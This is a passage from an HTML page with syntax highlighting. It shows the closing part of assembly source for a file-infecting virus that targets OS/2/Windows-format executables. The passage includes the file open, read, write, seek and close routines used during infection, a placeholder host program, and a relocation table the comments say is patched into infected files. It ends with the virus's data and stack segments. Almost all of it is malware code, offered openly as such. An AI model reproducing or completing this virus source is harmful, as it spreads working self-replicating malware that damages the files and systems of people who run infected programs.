</span><span class="sc5">ROPEN</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosOpen</span><span class="sc0">                 </span><span class="sc1">;open file</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;set z flag</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;return with handle/error in ax</span><span class="sc0">

</span><span class="sc1">;Read cx bytes of data to ds:dx from the file whose handle is FHANDLE.</span><span class="sc0">
</span><span class="sc5">FILE_READ</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;and pass handle to _lread</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;buffer to read to</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;bytes to read</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;and place to store actual bytes read</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">WRITTEN</span><span class="sc0">
</span><span class="sc5">RREAD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosRead</span><span class="sc0">                 </span><span class="sc1">;read it</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;check for error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WRITTEN</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;ax=bytes written</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FRET</span><span class="sc0">                    </span><span class="sc1">;wasn't an error</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">;set carry if an error</span><span class="sc0">
</span><span class="sc5">FRET</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Write cx bytes of data at ds:dx to the file whose handle is FHANDLE.</span><span class="sc0">
</span><span class="sc5">FILE_WRITE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;and pass handle to DosWrite</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;buffer to write from</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;bytes to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">WRITTEN</span><span class="sc0">          </span><span class="sc1">;put actual # of bytes written here</span><span class="sc0">
</span><span class="sc5">RWRITE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosWrite</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WRITTEN</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save it in ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FWET</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">FWET</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Seek to location dx:cx in file. Return absolute file pointer in cx:ax.</span><span class="sc0">
</span><span class="sc5">FILE_SEEK_ST</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">FILE_SEEK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;push file handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;number of bytes to move</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">;ax=origin to seek from</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;0=beginning, 1=current, 2=end</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">WRITTEN</span><span class="sc0">          </span><span class="sc1">;place to put absolute file ptr</span><span class="sc0">
</span><span class="sc5">RSEEK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosChgFilePtr</span><span class="sc0">           </span><span class="sc1">;go set file pointer</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WRITTEN</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WRITTEN</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FSET</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">FSET</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Close the file FHANDLE.</span><span class="sc0">
</span><span class="sc5">FILE_CLOSE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;pass handle to DosClose</span><span class="sc0">
</span><span class="sc5">RCLOSE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosClose</span><span class="sc0">                </span><span class="sc1">;and do it</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;The following HOST is only here for the inital startup program. Once the virus</span><span class="sc0">
</span><span class="sc1">;infects a file, the virus will jump to the startup code for the program it</span><span class="sc0">
</span><span class="sc1">;is attached to.</span><span class="sc0">
</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">                               </span><span class="sc1">;termiate all threads</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;return code 0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosExit</span><span class="sc0">                         </span><span class="sc1">;terminate program</span><span class="sc0">


</span><span class="sc1">;The following are the relocatables added to the relocation table in this</span><span class="sc0">
</span><span class="sc1">;sector in order to accomodate the virus. This must be the last thing in the</span><span class="sc0">
</span><span class="sc1">;code segment in order for the patch program to work properly.</span><span class="sc0">
</span><span class="sc5">ARELOCS</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc0">                       </span><span class="sc1">;number of relocatables to add</span><span class="sc0">

</span><span class="sc5">R_OPEN</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">103H</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ROPEN</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc0">  </span><span class="sc1">;relocatables table</span><span class="sc0">
</span><span class="sc5">R_READ</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">103H</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">RREAD</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">137</span><span class="sc0">
</span><span class="sc5">R_WRITE</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">103H</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">RWRITE</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">138</span><span class="sc0">
</span><span class="sc5">R_SEEK</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">103H</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">RSEEK</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc0">
</span><span class="sc5">R_CLOSE</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">103H</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">RCLOSE</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">59</span><span class="sc0">
</span><span class="sc5">R_FFIRST</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">103H</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FFIRST</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">
</span><span class="sc5">R_FNEXT</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">103H</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FNEXT</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">65</span><span class="sc0">
</span><span class="sc5">R_DALSE</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">103H</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DALSE</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">
</span><span class="sc5">R_DFRSE</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">103H</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DFRSE</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc0">

</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc5">END_VIRUS</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;label for the end of the windows virus</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;No data is hard-coded into the data segment since in OS/2, the virus must</span><span class="sc0">
</span><span class="sc1">;allocate the data segment when it runs. As such, we must assume it will be</span><span class="sc0">
</span><span class="sc1">;filled with random garbage when the program starts up. The CREATE_DS routine</span><span class="sc0">
</span><span class="sc1">;above initializes some of the data used in this segment that would be</span><span class="sc0">
</span><span class="sc1">;hard-coded in a normal program.</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">USE16</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">

</span><span class="sc5">DATASTART</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">FILE_ID1</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">;for searching for files</span><span class="sc0">
</span><span class="sc5">FILE_ID2</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">;for searching for files</span><span class="sc0">
</span><span class="sc5">KNAME</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">;"DOSCALLS"</span><span class="sc0">
</span><span class="sc5">VSTART</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;starting offset of virus in ram</span><span class="sc0">
</span><span class="sc5">WRITTEN</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;bytes actually written to file</span><span class="sc0">
</span><span class="sc5">ENTRYPT</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;initial ip of virus start</span><span class="sc0">
</span><span class="sc5">NH_OFFSET</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;new header offset from start of file</span><span class="sc0">
</span><span class="sc5">VIRSECS</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;size added to file (secs) for virus</span><span class="sc0">
</span><span class="sc5">INITSEC</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;initial cs loc in file (sectors)</span><span class="sc0">
</span><span class="sc5">RELOCS</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;number of relocatables in cs</span><span class="sc0">
</span><span class="sc5">LOG_SEC</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;logical sector size for program</span><span class="sc0">
</span><span class="sc5">CS_SIZE</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;code segment size</span><span class="sc0">
</span><span class="sc5">KERNEL</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;KERNEL module number</span><span class="sc0">
</span><span class="sc5">FHANDLE</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;file handle for new host</span><span class="sc0">
</span><span class="sc5">OPENACTION</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;used by DosOpen</span><span class="sc0">
</span><span class="sc5">SRCHCOUNT</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;used by DosFindFirst/Next</span><span class="sc0">
</span><span class="sc5">DHANDLE</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;used bo DosFindFirst/Next</span><span class="sc0">
</span><span class="sc5">NEW_HDR</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">NEW_HDR_SIZE</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;space to put new exe header in</span><span class="sc0">
</span><span class="sc5">TEMP</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">DATABUF_SIZE</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;temporary data storage</span><span class="sc0">
</span><span class="sc5">SBUF</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">279</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">;DosFind search buffer structure</span><span class="sc0">

</span><span class="sc5">DATAEND</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">_STACK</span><span class="sc0">  </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">USE16</span><span class="sc0"> </span><span class="sc5">STACK</span><span class="sc0"> </span><span class="sc12">'STACK'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5120</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_STACK</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">

        </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">VIRUS</span><span class="sc0">
</span></div></body>
</html>
